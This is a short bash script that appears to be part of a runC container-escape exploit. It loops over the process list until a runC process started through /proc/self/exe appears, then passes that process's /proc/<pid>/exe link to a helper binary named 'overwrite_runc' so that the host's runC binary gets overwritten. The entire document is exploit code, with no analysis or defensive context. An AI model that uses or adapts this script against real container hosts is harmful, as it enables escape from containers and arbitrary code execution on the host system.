#!/bin/bash_original
echo "[+] Waiting for runC to be executed in the container..."

runc_pid=$(ps axf | grep /proc/self/exe | grep -v grep | awk '{print $1}')

# Wait for /proc/self/exe to be executed
while [ -z "$runc_pid" ] 
do
    runc_pid=$(ps axf | grep /proc/self/exe | grep -v grep | awk '{print $1}')
done

# Call overwrite_runc with the symlink to the runC binary
./overwrite_runc /proc/${runc_pid}/exe 


